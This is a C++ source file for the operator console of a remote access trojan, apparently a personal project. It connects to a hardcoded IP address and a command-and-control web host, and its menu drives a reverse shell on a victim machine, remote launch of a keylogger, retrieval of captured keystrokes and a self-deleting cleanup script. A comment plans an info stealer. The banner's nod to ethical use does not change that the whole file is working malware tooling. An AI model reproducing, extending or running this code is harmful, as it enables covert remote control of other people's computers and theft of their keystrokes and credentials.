/*

    console 
    no keystroke injection
    need to add target info stealer

*/

// cl /EHsc .\console.cpp /link ws2_32.lib /OUT:console.exe  
#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <sstream>
#include <mutex>
#include <fstream>

using namespace std;
#pragma comment(lib, "ws2_32.lib")

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
int argc_global;
char **argv_global;

bool targetconnected = false;
#define MAX_IP_LENGTH 16
#define MAX_TEXT_LENGTH 256
char ipAddress[MAX_IP_LENGTH], randomText[MAX_TEXT_LENGTH];
char os;

SOCKET sock;
std::mutex socketMutex; 
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool socket_setup(SOCKET &clientSocket);
void safe_closesocket(SOCKET &clientSocket);

void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
string receive_data(SOCKET &clientSocket, const string &filename);

void os_detection();
bool getdata_from_file();
char Get_menu_option();

int Rev_Shell(SOCKET &clientSocket);
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char *argv[]) 
{
    argc_global = argc;
    argv_global = argv;

    bool loop = true;
    while(loop)
    {
        switch (Get_menu_option())
        {
            case '1':                                                                   //connect
            {   
                socket_setup(sock);
                send_data(sock,"from_server.txt","`");

                string connected_target = receive_data(sock,"target_name.rat");

                // if(connected_target[0] == '`')
                // {
                    //cout << ">> No targets connected!" << endl;
                    //system("pause");
                    //break;
                //}
                //else 
                //{
                    targetconnected = true;
                    cout << ">> Target connected: " << connected_target << endl;
                    system("pause");
                //}
                break;
            }

            case '2':                                                                   //Get info
            {
                if (targetconnected) 
                {
                    cout<< receive_data(sock,"target_data.rat");
                    system("pause");
                } 
                else
                {
                    cout << ">> Target not connected or socket invalid!!" << endl;
                    system("pause");
                }
                break;
            }

            case '3':                                                                   //Rev shell
            {
                if (targetconnected) 
                {
                    send_data(sock,"from_server.txt","3");
                    cout << ">> Sent " << endl;
                } 
                else
                {
                    cout << ">> Target not connected or socket invalid!!" << endl;
                    system("pause");
                }
                
                Rev_Shell(sock);

                break;
            }
            case '4':                                                                   //Execute keylogger
            {
                if (targetconnected)
                {
                    send_data(sock,"from_server.txt", "4key_l.exe");
                    cout << ">> Sent " << endl;
                }
                else cout << ">> Target not connected or socket invalid!!" << endl;
                system("pause");

                break;
            }

            case '5':                                                                   //stop keylogger
            {
                if (targetconnected)
                {
                    std::ofstream outputFile("keystrokes.txt", std::ios::app);

                    send_data(sock,"key_strokes.txt", "`");
                    send_data(sock,"klogger_cmd.txt", "s");
                    cout << ">> Sent stop" << endl;
                    
                    string temp;
                    
                    bool wait = true;
                    while(wait)
                    {

                        temp = receive_data(sock,"key_strokes.txt");
                        
                        if(temp[0] == '`')
                        {
                            Sleep(500);
                            continue;
                        }
                        else wait = false;
                    }
                    
                    outputFile << temp;
                    outputFile.close();

                    cout << ">> !! Keylogger stopped and [key_strokes.txt] Generated " << endl;
                    system("pause");
                }
                else cout << ">> Target not connected or socket invalid!!" << endl;
                system("pause");

                break;
            }

            case '~':                                                                   //DC Current target
            {
                if (targetconnected)
                {
                    send_data(sock,"from_server.txt","~");
                    send_data(sock,"target_name.rat","`");
                    targetconnected = false;

                    if (socket_setup(sock) == false)
                    {
                        cout << ">> Fuk" << endl;
                        return 1;
                    }
                    cout << ">> Disconnecting client..." << endl << endl;
                }
                else cout << ">> No client connected to disconnect." << endl;
                system("pause");
                
                break;
            }
            case '#':                                                                   //DC Current target and stop its code execution
            {

                if (targetconnected)
                {
                    send_data(sock,"from_server.txt", "#del.vbs");
                    cout << ">> Sent " << endl;

                    targetconnected = false;
                    send_data(sock,"target_name.rat","`");
                    cout << ">> Disconnecting client and cleaning..." << endl << endl;
                }
                else cout << ">> No client connected." << endl;
                system("pause");
                
                break;
            }
            case '0':                                                                   //Exit console
            {

                if(!targetconnected)
                {

                    WSACleanup();
                    cout << ">> Exiting..." << endl << endl;
                    loop = false;
                }
                else
                {
                    cout << ">> Target not disconnected!!" << endl;
                    system("pause");
                }
                break;
            }
            default:
            {
                cout << ">> Invalid option ( -_- )" << endl << endl;
                system("pause");
                break;
            }
        }
    }   
    return 0;
}

bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                wcerr << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}

void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
{
    {
        lock_guard<mutex> lock1(socketMutex); 
        
        socket_setup(clientSocket);

        string whole_data = filename+data;
        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
        httpRequest += "Host: arth.imbeddex.com\r\n";
        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
        httpRequest += "Content-Type: application/octet-stream\r\n";
        httpRequest += "Connection: close\r\n\r\n";
        httpRequest += whole_data;                                                                // Append the actual data


        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            wcerr << L"Send failed with error: " << error << L" (" << gai_strerror(error) << L")" << endl;
        }
    
        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                receivedData += buffer; // Append to the received data
            } else if (bytesReceived == 0) {
                cerr << "Connection closed by server." << endl;
                break; // Exit the loop on clean close
            } else {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) {
                    wcerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                }
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

        //cout << "\n\nReceived: " << receivedData << endl;

        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        safe_closesocket(clientSocket);
    }
}

string receive_data(SOCKET &clientSocket, const string &filename)
{
    {
        lock_guard<mutex> lock1(socketMutex);

        socket_setup(clientSocket);

        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
        httpRequest += "Host: arth.imbeddex.com\r\n";
        httpRequest += "Connection: close\r\n\r\n";

        //cout<< httpRequest<<endl;

        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            wcerr << L"Send failed with error: " << error << L" (" << gai_strerror(error) << L")" << endl;
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do
        {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

            if (bytesReceived > 0)
            {
                buffer[bytesReceived] = '\0';
                receivedData += buffer; // Append to the received data
            } 
            else if (bytesReceived == 0) 
            {
                cerr << "Connection closed by server." << endl;
                break; // Exit the loop on clean close
            } 
            else 
            {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) wcerr << "Receive failed with error: " << error << L" (" << gai_strerror(error) << L")" << endl;
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

        //cout << "\n\nReceived: \n" << receivedData << endl;

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        // Robust HTTP response parsing
        size_t headerEnd = receivedData.find("\r\n\r\n");
        if (headerEnd == string::npos) {
            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
            return "";
        }

        string body = receivedData.substr(headerEnd + 4);

        //Handle chunked transfer encoding (if present)
        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
        if (transferEncodingPos != string::npos)
        {
            string unchunkedBody;
            istringstream bodyStream(body);
            string chunkLengthStr;

            while (getline(bodyStream, chunkLengthStr))
            {
                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

                size_t chunkSize;
                stringstream ss;
                ss << hex << chunkLengthStr;
                ss >> chunkSize;

                if (chunkSize == 0) break; // End of chunked data

                string chunkData(chunkSize, '\0');
                bodyStream.read(&chunkData[0], chunkSize);

                unchunkedBody += chunkData;
                bodyStream.ignore(2); // Consume CRLF after chunk
            }
            body = unchunkedBody;
        }
        safe_closesocket(clientSocket);

        return body;

    }
}

void os_detection()
{
    #if defined(_WIN32) || defined(_WIN64)
        os = 'W';
    #elif defined(__linux__)
        os = 'L';
    #elif defined(__APPLE__) || defined(__MACH__)
        os = 'M';
    #elif defined(__unix__) || defined(__unix)
        os = 'U';
    #endif
}

bool getdata_from_file()
{
    FILE *sourceFile;
    const char *fileName = NULL;


    if (argc_global < 3) return false;

    if (strcmp(argv_global[1], "-f") == 0) fileName = argv_global[2];
    else return false;


    sourceFile = fopen(fileName, "r");
    if (sourceFile == NULL)
    {
        perror("\n\n\t|||||| Failed to open file ||||||\n\n");
        return false;
    }


    while (fscanf(sourceFile, "%15s", ipAddress) == 1)                                                // Read the IP address
    {        
        fgetc(sourceFile);                                                                            // Consume the newline character left by fscanf
        if (fgets(randomText, MAX_TEXT_LENGTH, sourceFile) != NULL)                                   // Read the random text
        {
            randomText[strcspn(randomText, "\n")] = '\0';                                             // Remove the newline character if it exists in randomText
        }
    }

    fclose(sourceFile);

    return true;
}

int Rev_Shell(SOCKET &clientSocket)
{
    atomic<bool> processFinished(false);
   
    auto readThread = std::thread([&]()
    {
        while (!processFinished.load())
        {
            Sleep(500);
            if(receive_data(clientSocket,"from_client.txt")[0] == '`')
            {
                
                //cout<< "waiting for rev shell data " << endl;
                continue;
            }
            else 
            {
                string data = receive_data(clientSocket, "from_client.txt");
                send_data(clientSocket, "from_client.txt", "`");
                
                if (data.empty()) break;                                                            // Client has disconnected or there was an error
                cout << data << endl;
            }

        }
    });

    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())                                                                     
        {

            if (getline(cin, cmd))                                                                  //getline to allow multi-word commands
            {
                if (cmd == "exit")
                {
                    send_data(clientSocket, "from_server.txt" ,"exit");
                    
                    processFinished.store(true);
                    break;
                }
                if(!cmd.empty()) send_data(clientSocket, "from_server.txt" ,cmd);
            }

            Sleep(500);
        }
    });

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    // Wait for process threads to finish
    readThread.join();
    writeThread.join();
    processFinished.store(true);

    return 0;
}

char Get_menu_option()
{
    char option;

    system("cls");
    cout << R"(


                                  :::::::::      :::           :::::::::      ::: ::::::::::: 
                                 :+:    :+:   :+: :+:         :+:    :+:   :+: :+:   :+:      
                                +:+    +:+  +:+   +:+        +:+    +:+  +:+   +:+  +:+       
                               +#+    +:+ +#++:++#++:       +#++:++#:  +#++:++#++: +#+        
                              +#+    +#+ +#+     +#+       +#+    +#+ +#+     +#+ +#+         
                             #+#    #+# #+#     #+#       #+#    #+# #+#     #+# #+#          
                            #########  ###     ###       ###    ### ###     ### ###           

                                            [::] Made By Oorth :) [::]              
                                    
                                    [::] Use this Ethically, if you dont [::]
                                        [::] I'll just enjoy watching  [::]

                                            [::] UNDER DEVELOPMENT!! [::]
          
                            _________________________________________________________
                                                
                                                [::] Menu :) [::]

                                    Start communication                     1)";
    
    if(!targetconnected) cout << "  [-]\n";
    else cout << "  [o]\n";

    cout << R"(
                                    Target Info                             2
                                                                            )";            
                                    
    if(targetconnected)cout << R"(
                                    Rev Shell                               3
                                    Run KeyLogger                           4
                                    Get Keystrokes                          5
                                    Make Target try again after 5 sec      [~]
                                    DC target & close                      {#}
                                                                            )";

    cout << R"(
                                    Exit                                    0)";

    cout << "\n\n>> ";
    cin >> option;

    // if(cin.fail())
    // {
    //     cin.clear();
    //     cout << ">> INT Bro, Int ( -_- )" << endl << endl;
    //     system("pause");
    // }


    return option;

}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}